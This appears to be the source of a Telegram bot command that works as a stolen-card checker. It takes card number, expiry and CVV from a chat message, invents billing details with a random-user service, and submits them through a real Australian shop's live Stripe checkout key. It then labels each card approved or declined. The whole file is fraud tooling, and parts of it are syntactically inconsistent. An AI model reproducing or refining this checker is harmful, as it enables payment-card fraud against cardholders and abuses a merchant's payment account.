from main import bot
import logging
import os
import requests
import json
from rand_user import random_user_api
import time
import string
import random
from defs import *
from main import bot
from time import sleep
import random
from bs4 import BeautifulSoup
session = requests.session()
#N = 10
#rnd = ''.join(random.choices(string.ascii_lowercase +
                              #  string.digits, k = N))
BLACKLISTED = [400189]
@bot.message_handler(commands=['zc'])
async def zc(message):
	file = open('groups.txt', 'r') 
	if str(message.chat.id) + "\n" not in file.readlines():
		await bot.reply_to(message,'Chat id Not Authorized')
	#elif str(message.from_user.id) + "\n" not in file.readlines():
		#await bot.reply_to(message,'You are not authorized')
	else:
         tic = time.perf_counter()
         cc = message.text[len('/zc '):]
         splitter = cc.split('|')
         ccn = splitter[0]
         mm = splitter[1]
         yy = splitter[2]
         cvv = splitter[3]
         email = f"anirbajhaihsojhek@gmail.com"
         if not cc:
             return await bot.reply_to(
                 "<code>Send Card /chk cc|mm|yy|cvv.</code>"
             )   
         BIN = cc[:6]
         if BIN in BLACKLISTED:
             return await bot.reply_to(
                 "<b>BLACKLISTED BIN</b>"
                )
    # get guid muid sid
#    headers = {
#        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4571.0 Safari/537.36 Edg/93.0.957.0",
#        "Accept": "application/json, text/plain, */*",
#        "Content-Type": "application/x-www-form-urlencoded"
#    }
 #   s = session.post("https://m.stripe.com/6",
#                     headers=headers)
#    r = s.json()
#    Guid = r["guid"]
#    Muid = r["muid"]
    #Sid = r["sid"]
    
    # now 1 req
         head = {
          'authority': 'api.stripe.com',
          'method': 'POST',
          'path': '/v1/payment_pages',
          'scheme': 'https',
          'accept': 'application/json',
          'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
          'content-length': '507',
          'content-type': 'application/x-www-form-urlencoded',
          'dnt': '1',
          'origin': 'https://js.stripe.com',
          'referer': 'https://js.stripe.com/',
          'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '"Linux"',
          'sec-fetch-dest': 'empty',
          'sec-fetch-mode': 'cors',
          'sec-fetch-site': 'same-site',
          'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',}
    
         payload = {
           'items[0][type]': 'price',
           'items[0][id]': 'price_1HSIWeFERzn3dUPYBM6Oxdcj',
           'items[0][quantity]': '1',
           'mode': 'payment',
           'success_url': 'https://www.fitstuff.com.au/success',
           'cancel_url': 'https://www.fitstuff.com.au/canceled',
           'key': 'pk_live_51GxVEqFERzn3dUPYQuevpcOMzCsH5Idq90feF2VuuiVbhTpRXoETuZ7qxRmalEmTQACO1nJuV3rnlC9F2BwO2hhr00ZU1ZU1Y4',
           'referrer': 'https://fitstuff.com.au/',}
    
         rx = session.post("https://api.stripe.com/v1/payment_pages",
                           data=payload, headers=head)
         res = rx.text
         print(res)
         session_id = find_between(res,'"session_id": "','"')
         mess = await bot.reply_to(message,"Checking wait 1 req")
         random_user = random_user_api().get_random_user_info()
         payloads = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'billing_details[name]': random_user.first_name,
            'billing_details[email]': random_user.email,
            'billing_details[address][country]': 'US',
            'billing_details[address][postal_code]': random_user.postcode,
            'key': 'pk_live_51GxVEqFERzn3dUPYQuevpcOMzCsH5Idq90feF2VuuiVbhTpRXoETuZ7qxRmalEmTQACO1nJuV3rnlC9F2BwO2hhr00ZU1ZU1Y4',
            'payment_user_agent': 'stripe.js/e99643aff; stripe-js-v3/e99643aff; checkout',
         }
         edit1 = await bot.edit_message_text("Under Proccesing.. ",message.chat.id,mess.id,parse_mode="HTML")
         sleep(3)
         edit2 = await bot.edit_message_text("Under Proccesing.. 60%",message.chat.id,edit1.id,parse_mode="HTML")
         sleep(3)
         two = requests.post('https://api.stripe.com/v1/payment_methods', data = payloads)
         res1 = (two.text)
         token = find_between(res1,'"id": "','"')
         three_data = {
            'eid': 'NA',
            'payment_method': token,
            'expected_amount': '1000',
            'expected_payment_method_type': 'card',
            'key': 'pk_live_51GxVEqFERzn3dUPYQuevpcOMzCsH5Idq90feF2VuuiVbhTpRXoETuZ7qxRmalEmTQACO1nJuV3rnlC9F2BwO2hhr00ZU1ZU1Y4',
}       
         three_head = {
            'authority': 'api.stripe.com',
            'method': 'POST',
            'path': f'/v1/payment_pages/{session_id}/confirm',
            'scheme': 'https',
            'accept': 'application/json',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
            'content-length': '216',
            'content-type': 'application/x-www-form-urlencoded',
            'dnt': '1',
            'origin': 'https://checkout.stripe.com',
            'referer': 'https://checkout.stripe.com/',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36'}
         three = requests.post(f'https://api.stripe.com/v1/payment_pages/{session_id}/confirm', data = three_data, headers = three_head, allow_redirects= False)
         threee = three.text
         print (threee)
         toc = time.perf_counter()
         if "incorrect_cvc" in three.text:
               await bot.edit_message_text(f"""
 ✅<b>CC</b>➟ <code>{cc}</code>
<b>STATUS</b>➟ #ApprovedCCN
<b>MSG</b>➟ 
<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""",message.chat.id, edit2.id,parse_mode="HTML")
         elif "Unrecognized request URL" in rx.text:
             await bot.edit_message_text("[UPDATE] PROXIES ERROR")
    #elif rx.status_code == 200:
      #  await bot.reply_to(message,"""
#✔️<b>CC</b>➟ <code>{cc}</code>
#<b>STATUS</b>➟ 
#<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
#<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
#""")
         elif "cvc_check" in three.text:
         	await bot.edit_message_text(f"""
✅<b>CC</b>➟ <code>{cc}</code>
<b>STATUS</b>➟ #cvc_check": null
<b>MSG</b>➟ cvc_check": null
<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""",message.chat.id, edit2.id,parse_mode="HTML")
         else:
             await bot.edit_message_text(f"""
❌<b>CC</b>➟ <code>{cc}</code>
<b>STATUS</b>➟ Declined
<b>MSG</b>➟ 
<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""",message.chat.id, edit2.id,parse_mode="HTML")
